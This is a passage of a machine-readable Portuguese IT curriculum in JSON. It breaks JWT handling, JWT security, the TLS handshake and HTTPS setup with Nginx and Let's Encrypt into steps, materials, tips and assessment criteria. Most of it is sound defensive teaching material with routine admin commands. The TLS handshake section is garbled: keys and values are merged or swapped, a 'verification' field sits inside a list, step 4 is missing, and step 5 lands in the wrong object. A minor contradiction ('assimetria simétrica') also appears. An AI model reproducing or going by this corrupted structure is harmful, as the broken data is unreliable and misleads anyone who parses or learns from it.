                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura básica de um JWT",
                                  "subSteps": [
                                    "Estude a composição de um JWT: três partes separadas por pontos (Header.Payload.Signature).",
                                    "Aprenda que Header e Payload são objetos JSON codificados em Base64URL.",
                                    "Entenda que Signature é gerada com HMAC ou RSA usando uma chave secreta.",
                                    "Leia a RFC 7519 para conceitos fundamentais de JWT.",
                                    "Anote as diferenças entre JWTs assinados (JWS) e criptografados (JWE)."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito as três partes de um JWT e seu propósito.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação RFC 7519 (jwt.io ou site IETF)",
                                    "Navegador web"
                                  ],
                                  "tips": "Use diagramas visuais para memorizar a estrutura; desenhe no papel.",
                                  "learningObjective": "Identificar e descrever as três componentes principais de um JWT.",
                                  "commonMistakes": [
                                    "Confundir Base64URL com Base64 padrão (sem padding '=').",
                                    "Ignorar que Signature requer chave secreta para validação."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Decodificar manualmente o Header e o Payload",
                                  "subSteps": [
                                    "Obtenha um JWT de exemplo de jwt.io.",
                                    "Copie o Header (primeira parte antes do primeiro ponto) e decodifique em Base64URL usando uma ferramenta online como base64decode.org.",
                                    "Repita para o Payload (segunda parte).",
                                    "Converta o JSON decodificado em objeto legível e valide a sintaxe JSON.",
                                    "Compare com a visualização no jwt.io para confirmação."
                                  ],
                                  "verification": "Mostre o JSON decodificado do Header e Payload de um JWT exemplo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "JWT exemplo de jwt.io",
                                    "Ferramentas online: base64decode.org, jsonlint.com",
                                    "Editor de texto como VS Code"
                                  ],
                                  "tips": "Remova manualmente os paddings se necessário; pratique com múltiplos JWTs.",
                                  "learningObjective": "Executar decodificação Base64URL manual de Header e Payload.",
                                  "commonMistakes": [
                                    "Usar Base64 padrão em vez de Base64URL (ignora caracteres '-', '_').",
                                    "Não validar o JSON resultante, levando a erros de parsing."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e interpretar claims padrão no Payload",
                                  "subSteps": [
                                    "Liste claims registrados: iss (issuer), sub (subject), aud (audience), exp (expiration), iat (issued at).",
                                    "No Payload decodificado, localize e explique cada claim presente.",
                                    "Calcule timestamps: converta exp e iat para datas legíveis usando epochconverter.com.",
                                    "Identifique claims públicos como jti (JWT ID) ou privados customizados.",
                                    "Documente o significado de cada claim no contexto de autenticação."
                                  ],
                                  "verification": "Crie uma tabela explicando 5 claims de um Payload exemplo.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Epochconverter.com",
                                    "Lista de claims da RFC 7519"
                                  ],
                                  "tips": "Sempre verifique se exp está no futuro para JWT válido.",
                                  "learningObjective": "Reconhecer e interpretar claims padrão em um Payload JWT.",
                                  "commonMistakes": [
                                    "Confundir sub com iss (sub é o usuário, iss é o emissor).",
                                    "Interpretar timestamps em segundos como milissegundos."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Utilizar jwt.io para análise completa e verificação de Signature",
                                  "subSteps": [
                                    "Acesse jwt.io e cole um JWT exemplo na seção Debugger.",
                                    "Observe a decodificação automática de Header, Payload e claims.",
                                    "Gere uma chave secreta simples e verifique a Signature.",
                                    "Teste invalidação alterando Payload e vendo falha na Signature.",
                                    "Explore bibliotecas como jsonwebtoken (Node.js) para verificação programática básica."
                                  ],
                                  "verification": "Capture tela de jwt.io mostrando análise completa e verificação falha ao alterar Payload.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Site jwt.io",
                                    "Chave secreta de teste (ex: 'secret')"
                                  ],
                                  "tips": "Nunca use chaves reais em ferramentas públicas; limpe histórico.",
                                  "learningObjective": "Aplicar ferramenta jwt.io para decodificação e validação integral de JWT.",
                                  "commonMistakes": [
                                    "Ignorar warnings de chave pública/privada em assinaturas assimétricas.",
                                    "Alterar Header/Payload sem recodificar corretamente."
                                  ]
                                }
                              ],
                              "practicalExample": "Acesse jwt.io, gere um JWT com claims: iss='https://exemplo.com', sub='user123', aud='api', exp=(timestamp atual + 3600s), iat=(timestamp atual). Decodifique: Header={'alg':'HS256','typ':'JWT'}, Payload={'iss':'https://exemplo.com','sub':'user123' etc.}. Altere 'sub' para 'hacker' e veja Signature invalidar, demonstrando proteção contra adulteração.",
                              "finalVerifications": [
                                "Explicar corretamente as três partes de um JWT.",
                                "Decodificar manualmente Header e Payload de um exemplo.",
                                "Identificar e interpretar pelo menos 5 claims padrão.",
                                "Usar jwt.io para validar Signature e detectar adulteração.",
                                "Converter timestamps exp/iat para datas legíveis.",
                                "Listar diferenças entre Base64 e Base64URL."
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação (100% match com jwt.io).",
                                "Correta identificação de todos claims presentes (sem omissões).",
                                "Explicação clara de cada claim com exemplos contextuais.",
                                "Demonstração de verificação de Signature via ferramenta.",
                                "Uso correto de terminologia técnica (ex: JWS, claims registrados).",
                                "Ausência de erros comuns como confusão de Base64URL."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Entender algoritmos de assinatura (HMAC, RSA).",
                                "Desenvolvimento Web: Integração em APIs REST com autenticação stateless.",
                                "Segurança da Informação: Análise de tokens para detecção de vulnerabilidades.",
                                "Programação: Uso de bibliotecas como PyJWT ou jsonwebtoken.",
                                "Banco de Dados: Relação com sessões user (sub) e auditoria (iat)."
                              ],
                              "realWorldApplication": "Em APIs de e-commerce, JWTs autenticam usuários em requests stateless, permitindo acesso seguro a carrinhos sem sessões server-side; desenvolvedores decodificam para debug de falhas de expiração ou claims inválidos em microsserviços."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.2.2",
                            "name": "Gerar e validar JWTs em APIs",
                            "description": "Implementar geração de JWTs assinados com chaves simétricas (HS256) ou assimétricas (RS256) em um servidor Node.js ou Java, e validar tokens em endpoints protegidos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente Node.js e instalar dependências JWT",
                                  "subSteps": [
                                    "Criar um novo diretório de projeto e inicializar com `npm init -y`",
                                    "Instalar Express para servidor: `npm install express`",
                                    "Instalar jsonwebtoken: `npm install jsonwebtoken`",
                                    "Instalar dotenv para gerenciar chaves: `npm install dotenv`",
                                    "Criar arquivo .env com SECRET_KEY para HS256 e definir chaves para RS256"
                                  ],
                                  "verification": "Verificar se o servidor roda com `node server.js` sem erros e pacotes estão listados em package.json",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Node.js instalado",
                                    "npm",
                                    "Editor de código (VS Code)",
                                    "Terminal"
                                  ],
                                  "tips": "Use chaves fortes e nunca commite .env no git; adicione .env ao .gitignore",
                                  "learningObjective": "Configurar um ambiente de desenvolvimento pronto para manipulação de JWTs",
                                  "commonMistakes": [
                                    "Esquecer de instalar dependências",
                                    "Expor chaves em código fonte",
                                    "Não usar dotenv para variáveis de ambiente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar geração de JWT com algoritmo simétrico HS256",
                                  "subSteps": [
                                    "Criar rota de login POST /login que recebe email e senha",
                                    "Simular autenticação básica (comparar credenciais hardcoded por simplicidade)",
                                    "Usar jwt.sign() com payload {userId: 1, email}, secret de .env e opções {expiresIn: '1h', algorithm: 'HS256'}",
                                    "Retornar token no response JSON",
                                    "Testar com Postman ou curl enviando credenciais"
                                  ],
                                  "verification": "Gerar token válido ao logar e decodificá-lo em jwt.io confirmando payload e assinatura",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Projeto do Step 1",
                                    "Postman ou Insomnia",
                                    "jwt.io para debug"
                                  ],
                                  "tips": "Sempre defina expiresIn para evitar tokens eternos; use payload mínimo necessário",
                                  "learningObjective": "Gerar tokens JWT assinados simetricamente de forma segura",
                                  "commonMistakes": [
                                    "Não definir algorithm explicitamente",
                                    "Incluir dados sensíveis no payload",
                                    "Usar secret fraco ou hardcoded"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar geração de JWT com algoritmo assimétrico RS256",
                                  "subSteps": [
                                    "Gerar par de chaves RSA com `openssl genrsa -out private.pem 2048` e `openssl rsa -in private.pem -pubout -out public.pem`",
                                    "Adicionar caminhos das chaves ao .env",
                                    "Criar rota POST /login-rsa similar à anterior, mas usar jwt.sign(payload, privateKey, {algorithm: 'RS256', expiresIn: '1h'})",
                                    "Ler chaves com fs.readFileSync e process.env",
                                    "Testar geração e validar em jwt.io com public key"
                                  ],
                                  "verification": "Token gerado é válido quando verificado com chave pública em jwt.io ou código",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "OpenSSL instalado",
                                    "Projeto anterior",
                                    "Terminal para gerar chaves"
                                  ],
                                  "tips": "Armazene private.pem fora do repo; use chaves de pelo menos 2048 bits",
                                  "learningObjective": "Gerar tokens JWT com assinaturas assimétricas para cenários distribuídos",
                                  "commonMistakes": [
                                    "Confundir private com public key",
                                    "Não especificar formato PEM corretamente",
                                    "Chaves muito curtas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar validação de JWT em endpoints protegidos",
                                  "subSteps": [
                                    "Criar middleware function extractToken(req, res, next) que pega token de Authorization header 'Bearer <token>'",
                                    "Implementar validateToken com jwt.verify(token, secret ou publicKey, {algorithms: ['HS256'] ou ['RS256']})",
                                    "Adicionar req.user = decoded ao req se válido, senão 401 Unauthorized",
                                    "Proteger rota GET /profile com app.use('/profile', validateToken)",
                                    "Testar rota protegida com token válido e inválido"
                                  ],
                                  "verification": "Acesso negado sem token ou com inválido; req.user populado com token válido",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Projeto com tokens gerados",
                                    "Postman com headers Authorization"
                                  ],
                                  "tips": "Ignore query params para tokens; trate erros de verify com try-catch",
                                  "learningObjective": "Validar e extrair dados de JWTs para proteger rotas de API",
                                  "commonMistakes": [
                                    "Não strip 'Bearer ' do header",
                                    "Não checar algorithms permitidos",
                                    "Expor erros detalhados em produção"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar integralmente e adicionar logging/segurança extra",
                                  "subSteps": [
                                    "Criar script de teste com supertest ou manualmente no Postman",
                                    "Testar fluxos: login -> obter token -> acessar /profile -> token expira",
                                    "Adicionar logging com console.log ou winston para tentativas de autenticação",
                                    "Implementar refresh token básico (novo JWT com refresh_token)",
                                    "Rodar testes com HS256 e RS256 separadamente"
                                  ],
                                  "verification": "Todos os testes passam: geração, validação, expiração e refresh funcionam",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Postman collection",
                                    "Supertest opcional: npm install supertest --save-dev"
                                  ],
                                  "tips": "Automatize testes com Jest/Supertest para CI/CD",
                                  "learningObjective": "Garantir robustez da implementação JWT através de testes end-to-end",
                                  "commonMistakes": [
                                    "Ignorar expiração em testes",
                                    "Não testar tokens malformados",
                                    "Falta de logging para debug"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API de e-commerce, ao login de usuário em /auth/login, gere JWT HS256 com userId e roles; proteja /orders com middleware RS256 validando contra public key do servidor, permitindo apenas admins acessarem pedidos alheios.",
                              "finalVerifications": [
                                "JWT gerado com HS256/RS256 é válido em jwt.io",
                                "Endpoint protegido retorna 401 sem token ou com inválido",
                                "Dados do payload acessíveis em req.user após validação",
                                "Token expira corretamente após tempo definido",
                                "Logs registram tentativas de autenticação falhas",
                                "Testes end-to-end passam para ambos algoritmos"
                              ],
                              "assessmentCriteria": [
                                "Código modular com funções reutilizáveis para sign/verify",
                                "Tratamento adequado de erros (401, 403, 500)",
                                "Uso correto de variáveis de ambiente para segredos",
                                "Headers Authorization parseados corretamente",
                                "Algoritmos explicitamente configurados e restritos",
                                "Testes cobrem casos felizes e edge cases"
                              ],
                              "crossCurricularConnections": [
                                "Criptografia (assimetria simétrica, hashing)",
                                "Desenvolvimento Web (Express.js, REST APIs)",
                                "Segurança da Informação (autenticação stateless)",
                                "Banco de Dados (armazenar refresh tokens)",
                                "DevOps (gerenciar chaves em produção com vaults)"
                              ],
                              "realWorldApplication": "JWTs são essenciais em microsserviços como Netflix ou Spotify para autenticação entre serviços; em apps mobile/SPA para sessões stateless sem banco por request."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.2.3",
                            "name": "Gerenciar segurança em JWTs",
                            "description": "Aplicar boas práticas como rotação de chaves, evitar armazenamento de senhas em payloads, implementar middleware para verificação e mitigar ataques como token fixation.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Chaves Seguras e Rotação Periódica",
                                  "subSteps": [
                                    "Gere chaves de assinatura seguras usando bibliotecas como crypto em Node.js (mínimo 256 bits para HS256 ou chaves RSA/ECDSA).",
                                    "Armazene chaves em variáveis de ambiente ou gerenciadores de segredos (ex: AWS Secrets Manager).",
                                    "Implemente lógica de rotação: crie uma função que gera nova chave periodicamente (ex: a cada 24h via cron job).",
                                    "Atualize o servidor para usar a nova chave para novos tokens, mantendo suporte temporário para chaves antigas.",
                                    "Configure invalidade de tokens antigos após um período de graça (ex: 1h)."
                                  ],
                                  "verification": "Execute teste: gere token com chave antiga, rode rotação e confirme que token é rejeitado após período de graça.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Node.js",
                                    "jsonwebtoken npm package",
                                    "dotenv",
                                    "node-cron para agendamento"
                                  ],
                                  "tips": "Sempre teste rotação em ambiente de staging antes de produção para evitar lockouts.",
                                  "learningObjective": "Dominar geração e rotação segura de chaves para prevenir comprometimento prolongado.",
                                  "commonMistakes": [
                                    "Usar chaves fracas ou hardcoded",
                                    "Não implementar fallback para tokens em trânsito",
                                    "Ignorar sincronização de clocks entre issuer e verifier"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estruturar Payloads Seguros sem Dados Sensíveis",
                                  "subSteps": [
                                    "Defina schema de payload mínimo: inclua apenas userId, roles, exp (expiration) e iat (issued at).",
                                    "Nunca inclua senhas, emails ou dados PII no payload (use refresh tokens para dados sensíveis).",
                                    "Valide tamanho do payload para evitar bloat (mantenha < 1KB).",
                                    "Use claims padrão JWT (iss, aud, sub) para contexto adicional sem expor segredos.",
                                    "Teste serialização para garantir que payloads não vazem info via base64 decode."
                                  ],
                                  "verification": "Inspecione payload decodificado (jwt.io) e confirme ausência de senhas ou dados sensíveis; teste com payloads inválidos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "jsonwebtoken",
                                    "Editor de código (VS Code)",
                                    "jwt.io para debug"
                                  ],
                                  "tips": "Lembre-se: payload é base64, não criptografado – qualquer um pode ler.",
                                  "learningObjective": "Aprender a minimizar exposição de dados em tokens stateless.",
                                  "commonMistakes": [
                                    "Incluir senhas hashed no payload",
                                    "Expor dados desnecessários como emails",
                                    "Ignorar limite de tamanho levando a tokens lentos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Middleware de Verificação Robusto",
                                  "subSteps": [
                                    "Crie middleware Express.js que extraia token do header Authorization (Bearer).",
                                    "Verifique assinatura, expiração, issuer (iss), audience (aud) e nbf (not before).",
                                    "Adicione validação de blacklists para tokens revocados (use Redis para storage).",
                                    "Implemente rate limiting por IP/usuário em endpoints protegidos.",
                                    "Registre logs de falhas de autenticação sem expor detalhes sensíveis."
                                  ],
                                  "verification": "Envie requests com tokens inválidos/expirados e confirme rejeição com 401; teste tokens válidos passam.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Express.js",
                                    "jsonwebtoken",
                                    "helmet npm para headers de segurança",
                                    "Redis opcional"
                                  ],
                                  "tips": "Sempre sanitize inputs e use try-catch para evitar crashes em tokens malformados.",
                                  "learningObjective": "Construir camadas de verificação para bloquear acessos não autorizados.",
                                  "commonMistakes": [
                                    "Não verificar expiração levando a replay attacks",
                                    "Aceitar tokens sem iss/aud",
                                    "Expor stack traces em erros"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Mitigar Ataques Específicos como Token Fixation",
                                  "subSteps": [
                                    "Implemente jti (JWT ID) único por token e blacklist em logout/revogação.",
                                    "Force reemissão de token em cada login (stateless, sem reutilização de session ID).",
                                    "Valide user agent/IP no middleware e rejeite mismatches (com tolerância para proxies).",
                                    "Use short-lived access tokens (15min) com refresh tokens longos armazenados securely.",
                                    "Teste ataques: tente fixar token antigo e confirme invalidação."
                                  ],
                                  "verification": "Simule fixation enviando token antigo pós-logout; confirme rejeição via jti blacklist.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "jsonwebtoken",
                                    "Redis para blacklist",
                                    "Postman para testes de ataques"
                                  ],
                                  "tips": "Combine com CSRF protection em frontend para defesa em profundidade.",
                                  "learningObjective": "Identificar e neutralizar vetores de ataque comuns em JWTs.",
                                  "commonMistakes": [
                                    "Reutilizar jti entre sessões",
                                    "Tokens long-lived sem refresh",
                                    "Não blackliste em logout"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testes Integrados e Monitoramento Contínuo",
                                  "subSteps": [
                                    "Escreva unit tests para cada função (rotação, verificação, payloads).",
                                    "Configure integração tests com ferramentas como Supertest para fluxos completos.",
                                    "Adicione métricas (Prometheus) para taxa de falhas JWT e alertas em anomalias.",
                                    "Audite código com linters de segurança (eslint-plugin-security).",
                                    "Realize pentest manual com ferramentas como jwt_tool para vulnerabilidades."
                                  ],
                                  "verification": "Rode suite de testes (100% coverage em funções JWT) e confirme zero falhas em cenários de ataque.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Jest/Mocha para tests",
                                    "Supertest",
                                    "jwt_tool CLI",
                                    "Prometheus/Grafana"
                                  ],
                                  "tips": "Automatize testes em CI/CD para deploy seguro.",
                                  "learningObjective": "Estabelecer práticas de teste e monitoramento para manutenção de segurança.",
                                  "commonMistakes": [
                                    "Tests superficiais sem vetores de ataque",
                                    "Ignorar monitoramento pós-deploy",
                                    "Não auditar dependências (npm audit)"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API Node.js/Express para um app de e-commerce, implemente login que gera JWT com userId/roles/exp (15min), middleware verifica em /orders, rotação diária de chaves via cron, payloads sem senhas, e jti blacklist no logout para mitigar fixation – teste com Postman simulando ataques.",
                              "finalVerifications": [
                                "Rotação de chaves invalida tokens antigos após grace period.",
                                "Payloads decodificados não revelam dados sensíveis.",
                                "Middleware rejeita 100% dos tokens inválidos/expirados/fixos.",
                                "Sistema resiste a replay e fixation em testes simulados.",
                                "Logs capturam falhas sem vazamento de info.",
                                "Métricas mostram zero falhas em produção simulada."
                              ],
                              "assessmentCriteria": [
                                "Corretude na rotação e verificação de chaves (sem lockouts).",
                                "Payloads minimalistas e seguros (ausência de PII).",
                                "Middleware cobre todos claims obrigatórios e ataques comuns.",
                                "Integração stateless com refresh tokens.",
                                "Cobertura de testes >90% com cenários de falha.",
                                "Documentação clara de configurações de segurança."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Assinaturas digitais e gerenciamento de chaves.",
                                "Desenvolvimento Web: APIs REST e middleware em frameworks.",
                                "Segurança de Redes: Mitigação de ataques como replay e fixation.",
                                "Banco de Dados: Blacklists em Redis/NoSQL para revogação.",
                                "DevOps: Automação de rotação via CI/CD e monitoramento."
                              ],
                              "realWorldApplication": "Em plataformas como bancos digitais (Nubank) ou streaming (Netflix), JWTs com rotação, payloads seguros e middleware protegem APIs de milhões de acessos diários, evitando breaches como vazamento de tokens e garantindo compliance com GDPR/PCI-DSS."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.4.3",
                        "name": "HTTPS e TLS/SSL",
                        "description": "Protocolo de camada de transporte seguro que criptografa comunicações HTTP usando TLS/SSL, protegendo contra eavesdropping, tampering e MITM em serviços web.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.3.1",
                            "name": "Compreender o handshake TLS",
                            "description": "Explicar o processo de handshake TLS 1.2/1.3, incluindo negociação de cifras, autenticação de servidor via certificados e troca de chaves pré-mestre.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Básicos e o Client Hello",
                                  "subSteps": [
                                    "Estude o que é TLS e sua evolução de SSL.",
                                    "Identifique os objetivos do handshake: negociação de parâmetros, autenticação e geração de chaves.",
                                    "Analise o Client Hello: lista de cifras suportadas, versão TLS, extensões como SNI.",
                                    "Desenhe um diagrama simples do Client Hello.",
                                    "Revise exemplos de campos no Client Hello usando documentação RFC."
                                  ],
                                  "verification": "Desenhe e explique um diagrama do Client Hello com pelo menos 5 campos chave.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação RFC 5246 (TLS 1.2) e RFC 8446 (TLS 1.3)",
                                    "Ferramenta de desenho como Draw.io",
                                    "Vídeo introdutório sobre TLS no YouTube"
                                  ],
                                  "tips": "Comece com TLS 1.2 para simplicidade antes de 1.3.",
                                  "learningObjective": "Compreender a iniciação do handshake pelo cliente e seus componentes essenciais.",
                                  "commonMistakes": [
                                    "Confundir Client Hello com Server Hello",
                                    "Ignorar extensões como SNI",
                                    "Não diferenciar versão TLS proposta"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Server Hello e Negociação de Cifras",
                                  "subSteps": [
                                    "Examine a resposta Server Hello: versão selecionada, cifra escolhida, número aleatório do servidor.",
                                    "Estude o processo de seleção de cifra: priorização por segurança e performance.",
                                    "Identifique diferenças em TLS 1.3: sem renegociação, cifras obrigatórias como AES-GCM.",
                                    "Simule a negociação com um fluxograma.",
                                    "Liste cifras comuns e seus níveis de segurança."
                                  ],
                                  "verification": "Crie uma tabela comparando cifras selecionadas em cenários diferentes.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "RFCs mencionadas",
                                    "Lista de cifras TLS no site da Mozilla",
                                    "Ferramenta online como TLS Lab"
                                  ],
                                  "tips": "Use ferramentas como ssllabs.com para ver negociações reais.",
                                  "learningObjective": "Dominar a negociação mútua de parâmetros criptográficos entre cliente e servidor.",
                                  "commonMistakes": [
                                    "Achar que o servidor sempre aceita a primeira cifra do cliente",
                                    "Confundir cifras com algoritmos de chave",
                                    "Ignorar forward secrecy"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compreender a Autenticação do Servidor via Certificados",
                                  "subSteps": [
                                    "Revise a estrutura de um certificado X.509: emissor, sujeito, chave pública, assinatura.",
                                    "Entenda o Server Certificate message e chain of trust.",
                                    "Aprenda a verificação: validar assinatura, data de validade, CRL/OCSP.",
                                    "Compare autenticação em TLS 1.2 vs 1.3 (certificados pós-handshake em 1.3).",
                                    "Pratique validando um certificado com openssl.",
                                    "verification: "
                                  ]
                                },
                                "estimatedTimeExecute código OpenSSL para inspecionar um certificado real.",
                                "40 minutos",
                                "materials: ["
                              ],
                              "OpenSSL instalado ou online tool como SSL CheckerOpenSSL man pages: [": "Certificados de sites reais (e.g., google.com)",
                              "Browser dev tools para exportar certs": "Use comando `openssl x509 -in cert.pem -text -noout`.",
                              "learningObjective": "Diferenciar versões e entender evoluções de segurança.",
                              "commonMistakes": [
                                "Achar 1.3 só mais rápido, ignorando crypto upgrades",
                                "Confundir 0-RTT risks"
                              ],
                              "stepNumber": 5,
                              "title": "Comparar TLS 1.2 vs 1.3 e Verificações Finais",
                              "subSteps": [
                                "Liste diferenças chave: remoção de RSA key exchange, handshake criptografado, 1-RTT.",
                                "Revise ataques mitigados (e.g., POODLE, downgrade).",
                                "Crie um fluxograma comparativo.",
                                "Teste compatibilidade com ferramentas como nmap.",
                                "Resuma o handshake completo em 1 minuto."
                              ],
                              "verification": "Apresente diferenças em tabela e explique um ataque mitigado por 1.3.",
                              "estimatedTime": "30 minutos",
                              "materials": [
                                "Comparação TLS 1.2/1.3 no Cloudflare blog",
                                "Nmap com script tls-enum-ciphers",
                                "Diagramas prontos para edição"
                              ],
                              "tips": "Foco em simplificações de 1.3 para memorização."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.3.2",
                            "name": "Configurar HTTPS em um servidor web",
                            "description": "Gerar e instalar certificados SSL/TLS usando Let's Encrypt ou self-signed, configurar servidores como Nginx ou Apache para forçar HTTPS e implementar HSTS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente do Servidor e Instalar Ferramentas",
                                  "subSteps": [
                                    "Atualize os pacotes do sistema com 'sudo apt update && sudo apt upgrade -y'",
                                    "Instale o Certbot via snap: 'sudo snap install --classic certbot'",
                                    "Configure o firewall para permitir portas 80 e 443: 'sudo ufw allow 'Nginx Full''",
                                    "Verifique se o domínio aponta para o IP do servidor via DNS (A record)",
                                    "Instale Nginx se não estiver presente: 'sudo apt install nginx'"
                                  ],
                                  "verification": "Execute 'certbot --version' e 'sudo systemctl status nginx' para confirmar instalações e 'sudo ufw status' para portas abertas",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Servidor Linux Ubuntu/Debian com acesso sudo",
                                    "Domínio registrado com DNS configurado"
                                  ],
                                  "tips": "Use snap para Certbot para garantir a versão mais recente e suporte a renovação automática",
                                  "learningObjective": "Preparar o servidor para obtenção segura de certificados Let's Encrypt",
                                  "commonMistakes": [
                                    "Esquecer de abrir porta 80 (necessária para validação ACME)",
                                    "Não configurar DNS corretamente levando a falhas de validação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Obter Certificado SSL/TLS com Let's Encrypt",
                                  "subSteps": [
                                    "Execute 'sudo certbot --nginx -d seudominio.com -d www.seudominio.com' para obter e instalar automaticamente",
                                    "Siga as prompts para fornecer email e concordar com termos",
                                    "Escolha redirecionar HTTP para HTTPS quando solicitado",
                                    "Verifique o certificado em /etc/letsencrypt/live/seudominio.com/",
                                    "Teste renovação manual: 'sudo certbot renew --dry-run'"
                                  ],
                                  "verification": "Confirme arquivos cert.pem, privkey.pem e chain.pem existem e 'sudo certbot certificates' lista o cert válido",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Certbot instalado",
                                    "Nginx rodando",
                                    "Domínio acessível via HTTP"
                                  ],
                                  "tips": "Inclua www.subdominio se necessário; Let's Encrypt é gratuito e renova a cada 90 dias automaticamente via cron",
                                  "learningObjective": "Gerar certificados válidos e automatizados usando ACME protocol",
                                  "commonMistakes": [
                                    "Executar sem porta 80 aberta",
                                    "Usar self-signed em produção (use apenas para dev: 'openssl req -x509 ...')"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Nginx para HTTPS",
                                  "subSteps": [
                                    "Edite /etc/nginx/sites-available/default: adicione server block para listen 443 ssl com ssl_certificate e ssl_certificate_key",
                                    "Copie caminhos do Certbot: ssl_certificate /etc/letsencrypt/live/seudominio.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/seudominio.com/privkey.pem",
                                    "Adicione configurações de segurança: ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5;",
                                    "Teste config: 'sudo nginx -t'",
                                    "Reinicie: 'sudo systemctl reload nginx'"
                                  ],
                                  "verification": "Acesse https://seudominio.com e verifique cadeado no navegador; 'curl -I https://seudominio.com' sem erros",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Editor de texto (nano/vim)",
                                    "Certificados obtidos"
                                  ],
                                  "tips": "Use fullchain.pem para cadeia completa; ative OCSP stapling para melhor performance",
                                  "learningObjective": "Integrar certificados em configuração de servidor web para tráfego criptografado",
                                  "commonMistakes": [
                                    "Caminhos errados de certs causando 502/SSL errors",
                                    "Não testar config antes de reload"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Redirecionamento HTTPS e HSTS",
                                  "subSteps": [
                                    "Adicione server block HTTP (listen 80) com return 301 https://$server_name$request_uri;",
                                    "No block HTTPS, adicione header: add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\";",
                                    "Teste config novamente: 'sudo nginx -t' e reload",
                                    "Configure renovação automática: verifique /etc/cron.d/certbot",
                                    "Para Apache alternativa: use a2enmod ssl e edite VirtualHost com SSLEngine on"
                                  ],
                                  "verification": "HTTP redireciona para HTTPS; 'curl -I https://seudominio.com' mostra Strict-Transport-Security header",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Config Nginx editada",
                                    "Conhecimento básico de headers HTTP"
                                  ],
                                  "tips": "HSTS preload requer submissão em hstspreload.org após max-age alto; teste em staging primeiro",
                                  "learningObjective": "Forçar uso de HTTPS e prevenir downgrade attacks com políticas de segurança",
                                  "commonMistakes": [
                                    "HSTS muito agressivo bloqueando acesso inicial",
                                    "Redirecionamento loop se mal configurado"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure HTTPS em um VPS Ubuntu para um site de blog em 'meublog.com' usando Nginx e Let's Encrypt: instale Certbot, obtenha cert para meublog.com e www.meublog.com, edite Nginx para ssl, force redirect e adicione HSTS. Acesse https://meublog.com com cadeado verde e sem warnings.",
                              "finalVerifications": [
                                "Site acessível apenas via HTTPS sem erros de certificado no navegador",
                                "Redirecionamento automático de HTTP para HTTPS",
                                "Header HSTS presente via curl -I https://seudominio.com",
                                "Renovação dry-run do Certbot succeeds",
                                "SSL Labs test (ssllabs.com) score A ou superior",
